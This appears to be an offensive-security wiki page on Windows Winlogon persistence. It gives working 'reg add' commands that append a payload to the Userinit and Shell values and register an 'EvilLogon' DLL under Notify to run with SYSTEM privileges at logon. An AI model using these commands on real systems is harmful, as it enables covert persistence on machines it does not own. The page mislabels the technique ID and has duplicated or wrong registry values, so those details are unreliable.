---
description: >-
  MITRE ATT&CK™ Boot or Logon Autostart Execution: Winlogon Helper DLL -
  Technique T1547.001
---

# Winlogon

## Theory

Winlogon, the Windows component that loads your user profile right after authentication. It can be abuse for persistence. We may edit the `Shell,` `Userinit & Notify` keys under HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ to make Winlogon load and execute malicious DLLs and/or executables.

## Practice

{% hint style="success" %}
Registry entries under `HKU/HKCU` will only apply to the user.\
Registry entries under `HKLM` will apply to everyone
{% endhint %}

{% hint style="danger" %}
If we'd replace any of the executables with some reverse shell, we would break the logon sequence, which isn't desired. **Interestingly, you can append commands separated by a comma, and Winlogon will process them all**.
{% endhint %}

{% tabs %}
{% tab title="Userinit " %}
We may edit the `Userinit` key to make our payload executed during Windows logon

* HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit&#x20;
* HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit&#x20;

```bash
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "C:\Windows\System32\Userinit.exe, C:\Windows\shell.exe" /f
```
{% endtab %}

{% tab title="Shell" %}
We may edit the `Shell` key to make our payload executed during Windows logon

* HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
* HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell

```bash
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, C:\Windows\shell.exe" /f
```
{% endtab %}

{% tab title="Notify" %}
We may edit the `Notify` key to make our payload executed during Windows logon. This registry key is typically found in older operating systems **(prior to Windows 7)** and it points to a notification package DLL file which handles Winlogon events. Replacing DLL entries under this registry key with an arbitrary DLL will cause Windows to execute it during logon.

* HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify

Add the following values and keys to the registry. These values communicate to Winlogon.exe and let it know which procedures to run during an event notification. Add as few or as many notification events as needed.

```

HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\NameOfProject
       \Asynchronous  REG_DWORD  0
       \Dllname       REG_SZ     NameOfDll.dll
       \Impersonate   REG_DWORD  0
       \Logon         REG_SZ     StartProcessAtWinLogon
       \Logoff        REG_SZ     StopProcessAtWinLogoff
       \...           REG_SZ     NameOfFunction
```

{% hint style="success" %}
The DLL will be executed with SYSTEM level privileges

The DLL should be in %NTROOT%\system32
{% endhint %}

```bash
#Create Project in Notify
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\EvilLogon"

#Create subkeys
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\EvilLogon" /t REG_DWORD /v Asynchronous /d 0
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\EvilLogon" /t REG_DWORD /v Asynchronous /d 0
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\EvilLogon" /t REG_SZ /v Dllname /d "evillogon.dll" 
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\EvilLogon" /t REG_SZ /v Logon /d "StartProcessAtWinLogon"
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\EvilLogon" /t REG_SZ /v Logoff /d "StartProcessAtWinLogon"
...
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://attack.mitre.org/techniques/T1547/004/" %}
